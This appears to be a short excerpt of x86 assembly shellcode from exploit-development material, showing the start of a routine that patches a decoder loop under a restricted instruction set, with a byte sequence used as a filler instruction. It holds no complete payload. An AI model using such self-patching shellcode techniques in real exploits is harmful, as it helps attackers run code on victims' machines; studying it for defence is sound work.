...
shellcode:
    ...
    ; start patching. Assuming EAX points to the baseaddress of this code,
    ; the decoder loop will be around EAX+0x100. Since our limited instruction
    ; set does not include a direct way to add a value to a register, we have
    ; to do this in another way:
    PUSH    EAX                         ;                        > A4A3A2A1
                    db 0x00, 0x50, 0x00 ;NOP - ADD [EAX+0], DL
